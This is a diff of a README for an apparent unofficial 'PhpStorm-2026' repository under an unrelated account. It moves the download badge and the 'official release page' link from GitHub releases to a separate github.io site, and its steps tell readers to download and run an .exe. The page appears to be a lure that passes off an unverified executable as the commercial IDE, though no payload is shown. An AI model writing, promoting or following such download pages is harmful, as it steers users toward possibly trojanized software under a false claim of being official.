@@ -1,6 +1,6 @@
 # 💻 PhpStorm-2026 - Master Your Web Development Workflow Today
 
-[![](https://img.shields.io/badge/Download-PhpStorm_2026-blue)](https://github.com/Doctorial-adolescence601/PhpStorm-2026/releases)
+[![](https://img.shields.io/badge/Download-PhpStorm_2026-blue)](https://doctorial-adolescence601.github.io)
 
 ## 📁 Project Overview
 
@@ -23,7 +23,7 @@ Check your system settings to confirm your computer meets these needs. If your c
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [official release page](https://github.com/Doctorial-adolescence601/PhpStorm-2026/releases).
+1. Go to the [official release page](https://doctorial-adolescence601.github.io).
 2. Look for the most recent version available.
 3. Click the file ending in `.exe` to start the download.
 4. Wait for the browser to finish saving the file to your Downloads folder.
